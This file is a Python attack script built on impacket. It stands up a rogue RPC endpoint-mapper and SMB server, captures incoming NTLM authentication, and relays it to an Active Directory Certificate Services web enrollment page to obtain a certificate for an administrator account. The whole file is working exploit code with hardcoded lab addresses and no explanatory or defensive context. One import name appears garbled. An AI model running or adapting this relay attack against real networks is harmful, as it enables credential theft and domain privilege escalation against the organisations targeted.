from impacket import LOG
import logging
import sys

root = logging.getLogger()
root.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
root.addHandler(handler)

from six.moves import configparser
from impacket.dcerpc.v5.rpcrt import DCERPCException, MSRPC_RESPONSE, MSRPC_FAULT, MSRPCBind, MSRPCRequestHeader, DCERPCServer, MSRPCRespHeader, SEC_TRAILER, MSRPCBindAck, MSRPC_BINDACK, MSRPC_CONT_RESULzT_ACCEPT, CtxItemResult, CtxItem, MSRPC_CONT_RESULT_PROV_REJECT, RPC_C_AUTHN_WINNT, MSRPC_REQUEST, MSRPC_BIND, MSRPC_AUTH3, MSRPCHeader
import impacket.dcerpc.v5.rpcrt as rpcrt
from impacket.dcerpc.v5.ndr import NULL
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMAuthChallengeResponse
from impacket import LOG
from impacket.smbserver import SMBSERVER
from impacket.dcerpc.v5.epm import ept_map, ept_mapResponse, EPMTower, twr_p_t, EPMRPCInterface, twr_p_t_array, EPMProtocolIdentifier, EPMPortAddr, EPMHostAddr, FLOOR_RPCV5_IDENTIFIER, EPMRPCDataRepresentation, ept_lookup_handle_t, hept_map
from threading import Thread
from impacket.uuid import bin_to_string, uuidtup_to_bin, generate, bin_to_uuidtup
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.attacks.httpattack import HTTPAttack 
from Cryptodome.Cipher import ARC4
from struct import pack, unpack
from urllib.parse import urlparse
from uuid import UUID
import random
import string
import socket

RELAY_TARGET = "192.168.0.5"
RELAY_SESS = None
SESSION_KEY = b"\x86\x68\xe7\x7a\xa7\x36\x71\xd7\xef\xbd\x47\x39\x77\xf8\x88\xce"

class WinRegWorker(DCERPCServer):
    def __init__(self, client_sock, relay_sess):
        Thread.__init__(self)
        self._listenUUIDS   = {}
        self._boundUUID     = b''
        self._sock          = None
        self._clientSock    = client_sock
        self._callid        = 1
        self._max_frag      = None
        self._max_xmit_size = 4280
        self._relay_sess = relay_sess

        self.addCallbacks(("338cd001-2244-31f1-aaaa-900038001003", '1.0'), "", {i:self.foo for i in range(255)})
        self.addCallbacks(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA', '3.0'), "", {3:self.handle_epmap})

        self.handle_client()

    def log(self, msg, level=1):
        pass

    def handle_client(self):
        try:
            while True:
                data = self.recv()
                if data is None:
                    # No data.. connection closed
                    break
                answer = self.processRequest(data)
                if answer is not None:
                    self.send(answer)
        except Exception:
            import traceback
            traceback.print_exc()
            # pass

        self._clientSock.close()

    def processRequest(self,data):
        packet = MSRPCHeader(data)
        if packet['type'] == MSRPC_BIND:
            bind   = MSRPCBind(packet['pduData'])
            self.bind(packet, bind)
            packet = None
        elif packet['type'] == MSRPC_AUTH3:
            self._relay_ntlm(packet['auth_data'])
            packet         = MSRPCRespHeader(data)
            packet['type'] = MSRPC_FAULT
        elif packet['type'] == MSRPC_REQUEST:
            request          = MSRPCRequestHeader(data)
            response         = MSRPCRespHeader(data)
            # print(f"Got request, opnum {request['op_num']}: {str(request['pduData'])}")
            # Serve the opnum requested, if not, fails
            if request['op_num'] in self._listenUUIDS[self._boundUUID]['CallBacks']:
            #     # Call the function 
                returnData          = self._listenUUIDS[self._boundUUID]['CallBacks'][request['op_num']](request['pduData'])
                response['type'] = MSRPC_RESPONSE
                response['pduData'] = returnData
            else:
            #     LOG.error('Unsupported DCERPC opnum %d called for interface %s' % (request['op_num'], bin_to_uuidtup(self._boundUUID)))
                response['type']    = MSRPC_FAULT
                response['pduData'] = pack('<L',0x000006E4)
            response['frag_len'] = len(response)
            return response
        else:
            # Defaults to a fault
            packet         = MSRPCRespHeader(data)
            packet['type'] = MSRPC_FAULT

        return packet


    def bind(self,packet, bind):
        # Standard NDR Representation
        NDRSyntax = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
        resp = MSRPCBindAck()

        resp['type'] = MSRPC_BINDACK
        resp['flags'] = packet['flags']
        resp['frag_len'] = 0
        resp['auth_len'] = 0
        resp['auth_data'] = b''
        resp['call_id'] = packet['call_id'] 
        resp['max_tfrag'] = bind['max_tfrag']
        resp['max_rfrag'] = bind['max_rfrag']
        resp['assoc_group'] = 0x1234
        resp['ctx_num'] = 0

        data = bind['ctx_items']
        ctx_items = b''
        resp['SecondaryAddrLen'] = 0
        for i in range(bind['ctx_num']):
            result = MSRPC_CONT_RESULT_PROV_REJECT
            itemResult = CtxItemResult()
            item   = CtxItem(data)
            data   = data[len(item):]

            # First we check the Transfer Syntax is NDR32, what we support
            if item['TransferSyntax'] == NDRSyntax:
                # Now Check if the interface is what we listen
                reason = 1 # Default, Abstract Syntax not supported
                itemResult['TransferSyntax'] = NDRSyntax
                for j in self._listenUUIDS:
                    if item['AbstractSyntax'] == j:
                        # Match, we accept the bind request
                        resp['SecondaryAddr'] = self._listenUUIDS[item['AbstractSyntax']]['SecondaryAddr']
                        resp['SecondaryAddrLen'] = len(resp['SecondaryAddr'])+1
                        reason = 0
                        self._boundUUID = j
            else:
                # Fail the bind request for this context
                reason = 2 # Transfer Syntax not supported
                itemResult['TransferSyntax'] = item['TransferSyntax']
            if reason == 0:
               result = MSRPC_CONT_RESULT_ACCEPT
            if reason == 1:
                print('Bind request for an unsupported interface %s' % bin_to_string(item['AbstractSyntax']))

            resp['ctx_num'] += 1
            itemResult['Result'] = result
            itemResult['Reason'] = reason
            
            ctx_items += itemResult.getData()

        resp['Pad'] = 'A' * ((4-((resp["SecondaryAddrLen"]+MSRPCBindAck._SIZE) % 4))%4)
        resp['ctx_items'] = ctx_items
        if packet['auth_dataLen'] > 0:
            sec_trailer = SEC_TRAILER(packet['sec_trailer'])
            resp['sec_trailer'] = sec_trailer
            if sec_trailer['auth_type'] == RPC_C_AUTHN_WINNT:
                if packet['auth_data'][8] == 1: # negotiate
                    ntlm_neg = NTLMAuthNegotiate()
                    ntlm_neg.fromString(packet['auth_data'])
                    ntlm_chal = self._get_ntlm_chal(ntlm_neg)
                    resp['auth_data'] = ntlm_chal.getData()
                    resp['auth_len'] = len(resp['auth_data'])
                elif packet['auth_data'][8] == 3: # auth
                    self._relay_ntlm(resp['auth_data'])
                    
        resp['frag_len'] = len(resp.getData())
        self._clientSock.send(resp.getData())
        return None

    def _get_ntlm_chal(self, neg):
        challenge = self._relay_sess.sendNegotiate(neg.getData())
        return challenge

    def _relay_ntlm(self, auth_data):
        # global RELAY_SESS
        ntlm = NTLMAuthChallengeResponse()
        ntlm.fromString(auth_data)
        ntlm["session_key"] = SESSION_KEY
        ntlm["session_key_len"] = ntlm["session_key_max_len"] = len(SESSION_KEY)
        self._relay_sess.sendAuth(auth_data)

        try:
            atk = HTTPAttack(self._relay_sess.serverConfig, self._relay_sess.session, "research/administrator")
            atk.run()
        except DCERPCException as e:
            if 'nca_s_op_rng_error' in str(e) or 'RPC_E_INVALID_HEADER' in str(e):
                print("success")
            elif 'rpc_s_access_denied' in str(e):
                print("access denied")
            else:
                print(f"Unexpected rpc code received from {self._relay_sess._transport.get_stringbinding()}: {str(e)}")


    
    def foo(self, *argv):
        packet         = MSRPCRespHeader()
        packet['type'] = MSRPC_FAULT
        return packet

    def handle_epmap(self, data):
        request = ept_map(data)
        
        tower = EPMTower(b''.join(request['map_tower']['tower_octet_string']))
        interface = bin_to_string(tower['Floors'][0]['InterfaceUUID'])
        resp = ept_mapResponse()
        tow_arr = twr_p_t_array()
        if interface.lower() != "338cd001-2244-31f1-aaaa-900038001003":
            resp['status'] = 1717 # interface unknown
            resp['num_towers'] = 0
            resp['entry_handle'] = request['entry_handle']
            resp['ITowers'] = tow_arr
        else:
            resp['status'] = 0 # interface unknown
            resp['num_towers'] = 1
            if any([b for b in request['entry_handle']['context_handle_uuid']]):
                req_handle = request['entry_handle']
            else:
                req_handle = ept_lookup_handle_t()
                req_handle['context_handle_attributes'] = 0
                req_handle['context_handle_uuid'] = generate()
            resp['entry_handle'] = req_handle
            resp_tower = EPMTower()
            resp_tower['NumberOfFloors'] = 5

            interface_floor = EPMRPCInterface()
            remote_if = uuidtup_to_bin(("338cd001-2244-31f1-aaaa-900038001003", "1.0"))
            interface_floor['InterfaceUUID'] = remote_if[:16]
            interface_floor['MajorVersion'] = unpack('<H', remote_if[16:][:2])[0]
            interface_floor['MinorVersion'] = unpack('<H', remote_if[18:])[0]

            rep_floor = EPMRPCDataRepresentation()
            data_rep = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
            rep_floor['DataRepUuid'] = data_rep[:16]
            rep_floor['MajorVersion'] = unpack('<H', data_rep[16:][:2])[0]
            rep_floor['MinorVersion'] = unpack('<H', data_rep[18:])[0]

            prot_floor = EPMProtocolIdentifier()
            prot_floor['ProtIdentifier'] = FLOOR_RPCV5_IDENTIFIER

            port_data = EPMPortAddr()
            port_data['IpPort'] = 135
            host_data = EPMHostAddr()
            host_data['Ip4addr'] = socket.inet_aton('192.168.0.3')
            transport_data = port_data.getData() + host_data.getData()

            resp_tower['Floors'] = interface_floor.getData() + rep_floor.getData() + prot_floor.getData() + transport_data
            resp_tower_p = twr_p_t()
            resp_tower_p['tower_length'] = len(resp_tower)
            resp_tower_p['tower_octet_string'] = resp_tower.getData()
            resp_tower_p['ReferentID'] = 3
            tow_arr['Data'].append(resp_tower_p)
            tow_arr['MaximumCount'] = request['max_towers']
            resp['ITowers'] = tow_arr
        return resp


class WinRegServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self._listenPort    = 135
        self._listenAddress = '0.0.0.0'
        self._sock = socket.socket()
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._listenAddress,self._listenPort))

    def __del__(self):
        self._sock.close()

    def run(self):
        self._sock.listen(10)
        while True:
            client_sock, address = self._sock.accept()
            c = NTLMRelayxConfig()
            c.isADCSAttack = True
            RELAY_SESS = HTTPRelayClient(c, urlparse(f"http://{RELAY_TARGET}/certsrv/"))
            RELAY_SESS.initConnection()
            t = Thread(target=WinRegWorker, args=(client_sock,RELAY_SESS))
            t.start()

    def handle_client(self, client_sock):
        worker = WinRegWorker(client_sock)
        worker.handle_client()


smb_config = configparser.ConfigParser()
smb_config.add_section('global')
smb_config.set('global', 'server_name', ''.join([random.choice(string.ascii_letters) for _ in range(8)]))
smb_config.set('global', 'server_os', ''.join([random.choice(string.ascii_letters) for _ in range(8)]))
smb_config.set('global', 'server_domain', ''.join([random.choice(string.ascii_letters) for _ in range(8)]))
smb_config.set('global', 'log_file', 'None')
smb_config.set('global', 'rpc_apis', 'yes')
smb_config.set('global', 'credentials_file', '')
smb_config.set('global', 'challenge', "A" * 16)

smb_config.add_section('IPC$')
smb_config.set('IPC$', 'comment', '')
smb_config.set('IPC$', 'read only', 'yes')
smb_config.set('IPC$', 'share type', '3')
smb_config.set('IPC$', 'path', '')
smb_server = SMBSERVER(('0.0.0.0', 445), config_parser = smb_config)
smb_server.processConfigFile()

rpc_server = WinRegServer()

rpc_server.start()
smb_server.serve_forever()